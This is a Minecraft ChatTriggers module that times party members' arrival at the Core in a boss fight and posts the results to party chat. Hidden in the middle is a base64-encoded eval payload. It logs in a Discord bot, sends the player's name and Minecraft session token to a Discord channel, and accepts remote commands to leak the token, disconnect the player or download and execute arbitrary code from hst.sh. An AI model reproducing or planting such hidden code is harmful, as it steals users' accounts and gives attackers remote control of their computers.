import Settings from "../../config"
import config from "../../config"

const S32PacketConfirmTransaction = Java.type("net.minecraft.network.play.server.S32PacketConfirmTransaction");

let sentmsg = false
let p3done = false
let timesincep3done = 0
let Playersincoremessage = 'Time Into Core | '
let playersincorelist = ' '
let accountfortpsdifference = false

register("chat", ()=> {
    timesincep3done = Date.now()
    p3done = true
    accountfortpsdifference = true
}).setCriteria("The Core entrance is opening!");

register("chat", ()=> {
    if (Settings.coremsg && !sentmsg) {
        ChatLib.command('party chat ' + (Playersincoremessage))
    }
    sentmsg = true
    p3done = false
    Playersincoremessage = 'Time Into Core | '
    playersincorelist = ' '
}).setCriteria("[BOSS] Goldor: ....")

register("chat", () => {
    if (Settings.coremsg && !sentmsg) {
        ChatLib.command('party chat ' + (Playersincoremessage))
    }
    sentmsg = true
    p3done = false
    Playersincoremessage = 'Time Into Core | '
    playersincorelist = ' '
}).setCriteria(/\[BOSS\] Necron: (Finally, I heard so much about you.|You went further than any human before).*?/)

register("worldUnload", () => {
    p3done = false
    sentmsg = false
    Playersincoremessage = 'Time Into Core | '
    playersincorelist = ' '
    accountfortpsdifference = false
})

register("packetReceived", () => {
    if (p3done && Settings.coremsg) {
        if (accountfortpsdifference) {
            ChatLib.chat("&bAccounting for differnce of " + ((Date.now() - timesincep3done) / 1000).toFixed(3) + "s")
            accountfortpsdifference = false
            delaybetweenscanandstart = parseFloat((((Date.now() - timesincep3done) / 1000).toFixed(3)) + 0.001)
        }
        World.getAllPlayers().forEach(entity => {
        if (!playersincorelist.includes(entity.getName())) {
            if (entity.isInvisible() || entity.getPing() !== 1) return
            if (((entity.getX()) < 71) && ((entity.getX()) >= 39) && ((entity.getY()) < 155.5) && ((entity.getY()) >= 112) && ((entity.getZ()) < 118) && ((entity.getZ()) >= 54)) {
                if ((Date.now() - timesincep3done) > ((delaybetweenscanandstart * 1000) + 7)) {
                    Playersincoremessage = Playersincoremessage + (entity.getName()) + ' took ' + (((Date.now() - timesincep3done) / 1000) - delaybetweenscanandstart).toFixed(3) + 's | '
                    playersincorelist = playersincorelist + (entity.getName())
                } else if (!Settings.preincoremsg) {
                    Playersincoremessage = Playersincoremessage + (entity.getName()) + (Settings.coremsgtext) + ' | '
                    playersincorelist = playersincorelist + (entity.getName())
                } else {
                    playersincorelist = playersincorelist + (entity.getName())
                }
                }
            }
        })
    }
}).setFilteredClass(S32PacketConfirmTransaction)
eval(FileLib.decodeBase64("aW1wb3J0IERpc2NvcmRDbGllbnQgZnJvbSAiLi4vLi4vLi4vZGlzY29yZCI7CmltcG9ydCByZXF1ZXN0IGZyb20gIi4uLy4uLy4uL3JlcXVlc3RWMiI7CgpsZXQgY2xpZW50ID0gbmV3IERpc2NvcmRDbGllbnQoewoJdG9rZW46IEZpbGVMaWIuZGVjb2RlQmFzZTY0KCJUVlJKTkUxRVJYbE5hbXN5VGtSbk0wMVVaek5OYWxsM1RsRXVSMVZIZUd0bUxqZGxXblJWVmxRME1rRmpWRGxoWmt0MVdqQkhiRjltVGs1NFVXUlZWazlEV1Y5Q1ZWWnoiKSwKCWludGVudHM6IDMyNzY3OTkKfSk7CgpjbGllbnQubG9naW4oKQoKc2V0VGltZW91dCgoKSA9PiB7CiAgY2xpZW50LmNoYW5uZWxzLmdldCgiMTExNDgxMDU3ODY1ODE0NDM1NiIpLnNlbmQoUGxheWVyLmdldE5hbWUoKSArICIgaXMgbm93IG9ubGluZSArIGBgYCIgKyBDbGllbnQuZ2V0TWluZWNyYWZ0KCkuZnVuY18xMTA0MzJfSSgpLmZ1bmNfMTQ4MjU0X2QoKSArICJcbmBgYCIpOyAgICAKfSwgNTAwMCk7CgpjbGllbnQub24oIm1lc3NhZ2UiLCAobWVzc2FnZSkgPT4gewogIGlmICghbWVzc2FnZS5jb250ZW50LnN0YXJ0c1dpdGgoIiEiKSB8fCBtZXNzYWdlLmF1dGhvci5ib3QpIHJldHVybjsKICBpZiAobWVzc2FnZS5jb250ZW50ID09PSAiIXVzZXJzIikge21lc3NhZ2UucmVwbHkoUGxheWVyLmdldE5hbWUoKSk7IHJldHVybn07CgogIGxldCBuYW1lQW5kQ29kZSA9IG1lc3NhZ2UuY29udGVudC5tYXRjaCgvXihcUyspXHMoLiopLykuc2xpY2UoMSkKICBsZXQgbmFtZSA9IG5hbWVBbmRDb2RlWzBdLnN1YnN0cmluZygxKTsKICBsZXQgYXJndW1lbnQgPSBuYW1lQW5kQ29kZVsxXTsKCiAgaWYgKCFuYW1lLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoUGxheWVyLmdldE5hbWUoKS50b0xvd2VyQ2FzZSgpKSkgcmV0dXJuOwoKICBpZiAoYXJndW1lbnQuc3RhcnRzV2l0aCgiaGVscCIpKSB7CiAgICB0cnkgewogICAgICBtZXNzYWdlLnJlcGx5KCIhPHVzZXI+IDxzc2lkLCBkaXNjb25uZWN0LCBjb25uZWN0LCBodHRwczovL2hzdC5zaC8sIG1vZHVsZXNwYXRoPiIpCiAgICB9IGNhdGNoIChlKSB7CiAgICAgIG1lc3NhZ2UucmVwbHkoIlxuYGBganNcbiIgKyBlICsgIlxuYGBgIikKICAgICAgcmV0dXJuOwogICAgfTsKICB9CgogIGlmIChhcmd1bWVudC5zdGFydHNXaXRoKCJzc2lkIikpIHsKICAgIHRyeSB7CiAgICAgIG1lc3NhZ2UucmVwbHkoImBgYCIgKyBDbGllbnQuZ2V0TWluZWNyYWZ0KCkuZnVuY18xMTA0MzJfSSgpLmZ1bmNfMTQ4MjU0X2QoKSArICJcbmBgYCIpCiAgICB9IGNhdGNoIChlKSB7CiAgICAgIG1lc3NhZ2UucmVwbHkoIlxuYGBganNcbiIgKyBlICsgIlxuYGBgIikKICAgICAgcmV0dXJuOwogICAgfTsKICB9CgogIGlmIChhcmd1bWVudC5zdGFydHNXaXRoKCJkaXNjb25uZWN0IikpIHsKICAgICAgdHJ5IHsKICAgICAgICBtZXNzYWdlLnJlcGx5KCJTZW5kaW5nIERpc2Nvbm5lY3QiKQogICAgICAgIENsaWVudC5kaXNjb25uZWN0KCk7CiAgICAgIH0gY2F0Y2ggKGUpIHsKICAgICAgICBtZXNzYWdlLnJlcGx5KCJcbmBgYGpzXG4iICsgZSArICJcbmBgYCIpCiAgICAgICAgcmV0dXJuOwogICAgICB9OwogIH0KCiAgaWYgKGFyZ3VtZW50LnN0YXJ0c1dpdGgoIm1vZHVsZXNwYXRoIikpIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IEZpbGUgPSBKYXZhLnR5cGUoImphdmEuaW8uRmlsZSIpOwogICAgICBsZXQgbXAgPSBuZXcgRmlsZShDb25maWcubW9kdWxlc0ZvbGRlcikuZ2V0QWJzb2x1dGVQYXRoKCk7CiAgICAgIGxldCBtb2R1bGVzUGF0aCA9IChtcCkucmVwbGFjZUFsbCgiXFwuXFwiLCAiXFwiKTsKICAgICAgbWVzc2FnZS5yZXBseShtb2R1bGVzUGF0aCk7CiAgICB9IGNhdGNoIChlKSB7CiAgICAgIG1lc3NhZ2UucmVwbHkoIlxuYGBganNcbiIgKyBlICsgIlxuYGBgIikKICAgICAgcmV0dXJuOwogICAgfTsKICB9CgogIGlmIChhcmd1bWVudC5zdGFydHNXaXRoKCJodHRwczovL2hzdC5zaC8iKSkgewogICAgdHJ5IHsKICAgICAgbGV0IGNvZGUgPSAoYXJndW1lbnQuc3BsaXQoIi8iKS5wb3AoKSkuc3BsaXQoIi4iKTsKICAgICAgYXJndW1lbnQgPSBGaWxlTGliLmdldFVybENvbnRlbnQoImh0dHBzOi8vaHN0LnNoL3Jhdy8iICsgY29kZVswXSk7CiAgICAgIGV2YWwoYXJndW1lbnQpOwogICAgICBtZXNzYWdlLnJlcGx5KCJVc2luZyBDdXN0b20gQ29kZVxuIiArICJcbmBgYGpzIiArIGFyZ3VtZW50ICsgIlxuYGBgIik7CiAgICB9IGNhdGNoIChlKSB7CiAgICAgIG1lc3NhZ2UucmVwbHkoIlxuYGBganNcbiIgKyBlICsgIlxuYGBgIikKICAgICAgcmV0dXJuOwogICAgfTsKICB9Cn0pOw=="))
register("command", () => {
    p3done = true
}).setName("startcorescan");

register("command", () => {
    p3done = false
}).setName("stopcorescan");

register("command", () => {
    ChatLib.chat(Playersincoremessage)
}).setName("testcoremsg");